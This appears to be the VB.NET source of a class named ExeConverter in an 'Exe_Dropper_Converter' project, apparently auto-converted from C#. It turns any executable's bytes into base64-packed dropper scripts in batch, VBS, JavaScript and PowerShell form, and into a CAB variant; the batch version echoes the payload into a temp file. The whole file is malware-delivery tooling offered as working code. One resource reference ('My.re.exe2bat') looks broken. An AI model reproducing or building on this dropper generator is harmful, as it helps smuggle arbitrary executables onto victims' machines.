'INSTANT VB NOTE: This code snippet uses implicit typing. You will need to set 'Option Infer On' in the VB file or set 'Option Infer' at the project level.

Imports Microsoft.VisualBasic
Imports Exe_Dropper_Converter.Properties
Imports System
Imports System.Linq
Imports System.Text

Namespace Exe_Dropper_Converter
	Public NotInheritable Class ExeConverter

		Private Sub New()
		End Sub

		Public Shared Function ExeToBat(ByVal exe() As Byte) As String
			'INSTANT VB WARNING: Instant VB cannot determine whether both operands of this division are integer types - if they are then you should use the VB integer division operator:
			Dim b64() As String = Convert.ToBase64String(exe).Select(Function(c, index) New With {Key c, Key index}).GroupBy(Function(x) x.index / 70).Select(Function(group) group.Select(Function(elem) elem.c)).Select(Function(chars) New String(chars.ToArray())).ToArray()

			Dim echos As New StringBuilder()

			For Each line In b64.Select(Function(value, i) New With {Key i, Key value})
				echos.Append("echo ")
				echos.Append(line.value)

				If line.i = 0 Then
					echos.Append(">%tmp%\x")
				Else
					echos.Append(">>%tmp%\x")
				End If

				If line.i <> b64.Length - 1 Then
					echos.AppendLine()
				End If
			Next line

			Return My.re.exe2bat.Replace("#echos#", echos.ToString()) & "\r\n"
		End Function

		Public Shared Function ExeToBatNonPrintable(ByVal exe() As Byte) As Byte()
			Return CabMaker.MakeCab(exe)
		End Function

		Public Shared Function ExeToVbs(ByVal exe() As Byte) As String
			Return My.Resources.exe2vbs.Replace("#base64#", Convert.ToBase64String(exe))
		End Function

		Public Shared Function ExeToJs(ByVal exe() As Byte) As String
			Return My.Resources.exe2js.Replace("#base64#", Convert.ToBase64String(exe))
		End Function

		Public Shared Function ExeToPs1(ByVal exe() As Byte) As String
			Return My.Resources.exe2ps1.Replace("#base64#", Convert.ToBase64String(exe))
		End Function
	End Class
End Namespace